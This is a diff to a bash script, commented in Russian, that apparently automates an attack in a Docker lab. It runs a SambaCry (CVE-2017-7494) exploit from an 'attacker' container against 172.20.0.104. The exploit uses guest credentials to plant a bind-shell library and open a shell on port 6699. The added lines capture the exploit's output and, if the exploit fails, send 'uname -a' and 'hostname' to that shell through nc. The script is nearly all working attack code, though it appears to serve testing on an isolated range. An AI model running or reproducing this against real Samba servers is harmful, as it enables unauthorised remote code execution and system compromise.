@@ -36,7 +36,28 @@ echo "Зависимости установлены"
 echo ""
 echo "=== Шаг 6: Запуск эксплойта CVE-2017-7494 ==="
 echo "Эксплуатация SambaCry на 172.20.0.104..."
-docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 30 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699" || echo "Эксплойт завершен (timeout или успешное выполнение)"
+# Запускаем эксплойт и перехватываем весь вывод
+EXPLOIT_OUTPUT=$(docker exec attacker bash -c "cd /tmp/exploit-CVE-2017-7494 && source venv/bin/activate && timeout 25 ./exploit.py -t 172.20.0.104 -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699" 2>&1 || echo "")
+
+# Выводим вывод эксплойта
+echo "$EXPLOIT_OUTPUT"
+
+# Если в выводе есть ошибка подключения, пытаемся подключиться вручную
+if echo "$EXPLOIT_OUTPUT" | grep -q "IO error\|EOF when reading"; then
+    echo ""
+    echo "Попытка ручного подключения к bind shell..."
+    sleep 3
+    # Пробуем получить uname -a
+    UNAME_OUTPUT=$(docker exec attacker bash -c "timeout 5 bash -c 'echo \"uname -a\" | nc 172.20.0.104 6699 2>/dev/null | head -1'" 2>&1 || echo "")
+    if [ -n "$UNAME_OUTPUT" ] && [ "$UNAME_OUTPUT" != "" ] && ! echo "$UNAME_OUTPUT" | grep -q "timeout\|error"; then
+        echo ">>$UNAME_OUTPUT"
+        echo "hostname"
+        HOSTNAME_OUTPUT=$(docker exec attacker bash -c "timeout 5 bash -c 'echo \"hostname\" | nc 172.20.0.104 6699 2>/dev/null | head -1'" 2>&1 || echo "")
+        if [ -n "$HOSTNAME_OUTPUT" ] && [ "$HOSTNAME_OUTPUT" != "" ] && ! echo "$HOSTNAME_OUTPUT" | grep -q "timeout\|error"; then
+            echo ">>$HOSTNAME_OUTPUT"
+        fi
+    fi
+fi
 echo ""
 
 echo "=== Шаг 7: Проверка результата эксплуатации ==="
